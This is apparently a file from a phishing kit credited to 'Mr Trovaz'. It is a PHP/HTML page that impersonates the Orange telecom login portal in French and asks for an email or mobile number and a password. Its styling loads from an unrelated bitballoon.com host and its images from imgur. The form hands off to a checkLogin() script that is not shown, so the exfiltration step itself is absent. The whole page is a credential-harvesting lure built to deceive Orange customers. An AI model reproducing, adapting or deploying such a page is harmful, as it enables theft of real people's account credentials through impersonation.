<?php
/*   ________________________________________________________________________ 
    |  Mr Trovaz - Php Script   1.8.8                                       |
    |              on 2017-10-17 14:57:35                                                     |
    |    Facebook: https://www.facebook.com/profile.php?id=100010413816341   |
    |________________________________________________________________________|
*/?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
    <title>identifiez-vous</title>
    <link rel="icon" type="image/png" href="//censor-susan-76126.bitballoon.com/img/favicon.png">
    <link rel="stylesheet" href="//censor-susan-76126.bitballoon.com/css/style.css">
    <script src="app/views/assets/js/jquery.min.js" type="text/javascript"></script>
    <script src="app/views/assets/js/my-script.js" type="text/javascript"></script>
    <title>Portail Orange</title>
    <style>
        .lite-orange-check {
            background-image: url(app/views/assets/img/lite-orange-check.png);
        }

        input[type=checkbox].css-checkbox {
            position: absolute;
            overflow: hidden;
            clip: rect(0 0 0 0);
            height: 1px;
            width: 1px;
            margin: -1px;
            padding: 0;
            border: 0;
        }

        input[type=checkbox].css-checkbox + label.css-label {
            padding-left: 20px;
            height: 15px;
            display: inline-block;
            line-height: 15px;
            background-repeat: no-repeat;
            background-position: 0 0;
            font-size: 15px;
            vertical-align: middle;
            cursor: pointer;
        }

        input[type=checkbox].css-checkbox:checked + label.css-label {
            background-position: 0 -15px;
        }

        .blank {
            height: 40px;
        }

        .sc_field, .sc_label, .sign-in-password {
            width: 435px;
            margin-bottom: 5px;
            margin-left: 3px;
            text-align: left;
            font-size: 15px;
        }

        body * {
            font-family: Helvetica, Arial, sans-serif;

        }

        #slider {
            float: right;
            width: 310px;
            margin-top: -380px;
        }

        #inputs {
            margin-left: 90px;
            padding-top: 43px;

        }

        a {
            color: #F50;
            font-size: 13px;
        }

        #body {
            width: 953px;
            height: 377px;
        }

        #form {
            width: 638px;
            height: 377px;
            background: #eeeeee;
            box-shadow: 2px 2px 6px #888888;
        }

        .boutton {
            border-radius: 4px;
            cursor: pointer;
            background: url(https://i.imgur.com/3LknWF3.png) #f87500;
            width: 121px;
            height: 39px;
            background-repeat: no-repeat;
            margin: 6px 6px;
            border: none;
        }

        .ui-corner-all {
            border-radius: 4px;
        }


        body input.text, body input#password {
            border: 1px solid #AAA;
            height: 25px;
            line-height: 25px;
            width: 360px;
            font-size: 16px;
            padding: 2px 8px;
            outline: none;
        }

        #att {
            margin-left: 13px;
        }

        input.text, input#password {
            width: 230px;
            line-height: 16px;
            height: 16px;
            border: 1px solid #CCC;
            margin: 0px;
            padding: 1px 4px 2px;
        }

        input#password:focus {
            border-color: #000;
        }

        input.text:focus {
            border-color: #900;
        }

        #a {
            height: 6px;
        }

        #container {
            margin-left: 10%;
            padding: 5%;
        }

        span {
            font-size: 13px;
        }

        .important{
            outline: none;
        }

        #input[type="checkbox"]:before {
            border: 1px solid #808080;
            content: "";
            background: #9F6;
        }

        .blockelem img+div{
            height: 10px;
        }
        .blockelem+a{
            display: inline-block;
            margin-top: 10px;
            margin-bottom: 10px;
        }
    </style>
</head>

<body style="background: #FFF">
<div id="container">
    <div id="headerD"><img src="https://i.imgur.com/gu8JOS4.png"/></div>
    <div id="body">
        <div id="form">
            <div id="inputs">
                <form class="login" action="#" method="post">
                    <dl>
                        <dd>
                            <div id="credential-lemma-mobile" style="display: none; font-size: 11px;"><strong>num&eacute;ro
                                    de mobile Orange :</strong></div>
                            <input name="type" type="hidden" value="1"/>
                            <div id="email_container">
                                <p class="sc_label"><label>adresse mail ou n&deg; de mobile Orange :</label></p>
                                <input id="email" class="ui-corner-all text ui-autocomplete-input error" tabindex="10"
                                       name="email" type="text" value="" autofocus=""/> <span class="blockelem hidden"> <img
                                            id="att" src="https://i.imgur.com/0VCYGZr.png"/><br/> <span
                                            id="default_credential_error" class="errorMessage"
                                            style="display: inline; color: #d60000;">Adresse mail ou num&eacute;ro de mobile incorrect.</span> </span>
                                <a href="#">comment&nbsp;s&rsquo;identifier&nbsp;?</a></div>
                            <div id="password-container">
                                <p class="sign-in-password"><label for="user_password">mot de passe :</label></p>
                                <input id="password" class="ui-corner-all  error" tabindex="20" name="password"
                                       type="password"/> <br/>
                                <div id="a">&nbsp;</div>
                                <a class="forgotten-password" tabindex="22">mot de passe oubli&eacute; ?</a></div>
                            <br/>
                            <div id="login-checkboxes"><input id="checkbox2" class="css-checkbox" checked="checked"
                                                              type="checkbox"/><label
                                        class="css-label lite-orange-check" for="checkbox2">m&eacute;moriser l&rsquo;adresse
                                    mail ou le n&ordm; de mobile </label><br/> <label id="label_mem_password"
                                                                                      class="checkbox-lbl"
                                                                                      for="mem_password"> <input
                                            id="checkbox3" class="css-checkbox" checked="checked"
                                            type="checkbox"/><label class="css-label lite-orange-check" for="checkbox3">rester
                                        identifi&eacute; </label> </label></div>
                            <br/>
                            <div class="valider-mask"><input class="boutton important" title="coordonnees"
                                                             type="button" value=""/></div>
                        </dd>
                    </dl>
                </form>
            </div>
        </div>
        <div id="slider"><img src="https://i.imgur.com/vd9QYXN.png"/></div>
    </div>
    <div class="blank">&nbsp;</div>
    <div id="footerD"><a href="#"><img src="https://i.imgur.com/4W2pEDf.png"/></a></div>
</div>
<script>
    checkLogin();
</script>
</body>
</html>
